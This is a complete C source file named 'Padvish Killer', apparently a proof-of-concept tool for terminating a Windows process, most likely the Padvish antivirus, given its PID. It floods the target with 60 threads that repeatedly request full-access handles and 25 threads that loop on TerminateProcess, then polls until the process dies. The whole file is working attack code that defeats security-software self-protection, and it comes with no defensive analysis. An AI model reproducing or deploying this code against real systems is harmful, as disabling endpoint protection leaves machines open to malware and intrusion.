#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>

/*
    Padvish Killer
    Coded By Shahriyar Jalayeri
    twitter.com/ponez

*/

DWORD  gdwProcId    = 0; 
HANDLE ghProcHandle = NULL;

VOID
OpenHighPrivHandle(
    VOID
)
{
    /* Just loop over for ever and try to open a PROCESS_ALL_ACCESS handle to the given PID. */
    while (TRUE)
    {
        ghProcHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, gdwProcId);
    }
}

VOID
TerminateProc(
    VOID
    )
{
    /* Just loop over for ever and try to terminate the given PID. */
    while (TRUE)
    {
        TerminateProcess(ghProcHandle, EXIT_FAILURE);
    }
}

BOOL 
CleanUp(
    VOID
    )
{
    HANDLE hProccessSnapShot;
    PROCESSENTRY32 pEntry32;
    BOOL bStillAlive;

    while (TRUE)
    {
        bStillAlive = FALSE;

        /* Get a snapshot of the current running process... */
        hProccessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        if (hProccessSnapShot == INVALID_HANDLE_VALUE)
            return FALSE;

        /* Get the first process information in the snapshot... */
        pEntry32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hProccessSnapShot, &pEntry32))
            return FALSE;

        /* Loop over the snapshot and seek for the target process... */
        do
        {
            /* If we found the target process, it's still alive... */
            if (pEntry32.th32ProcessID == gdwProcId)
                bStillAlive = TRUE;
        } while (Process32Next(hProccessSnapShot, &pEntry32));

        /* Target process Killed, we are done. */
        if (bStillAlive == FALSE)
            return TRUE;

        /* Sleep for a while, then try again finding the target process. */
        Sleep(3000);
    }
}

int main(int argc, char **argv)
{
    HANDLE hThreadHandle;
    DWORD i;

    /* Get target PID... */
    gdwProcId = atoi(argv[1]);

    /** 
     *  too lazy to set only the OpenHighPrivHandle threads to BELOW_NORMAL_PRIORITY_CLASS,
     *  so we just set the whole process priority to BELOW_NORMAL_PRIORITY_CLASS 
     */
    if (SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS) == FALSE)
        return FALSE;

    /**
     *  Check to see if we can get a PROCESS_QUERY_INFORMATION handle to the process or not,
     *  if this fails there is problem...
     */
    if ((ghProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION, NULL, gdwProcId)) == NULL)
        return FALSE;
    
    /* Create the CleanUp thread ... */
    hThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CleanUp, NULL, 0, NULL);

    /* Create the TerminateProc threads ... */
    for (i = 0; i < 25; i++)
    {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TerminateProc, NULL, 0, NULL);
    }
    
    /* Create the OpenHighPrivHandle threads ... */
    for (i = 0; i < 60; i++)
    {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OpenHighPrivHandle, NULL, 0, NULL);
    }

    /* Wait for the CleanUp to finish its works... */
    WaitForSingleObject(hThreadHandle, INFINITE);
}

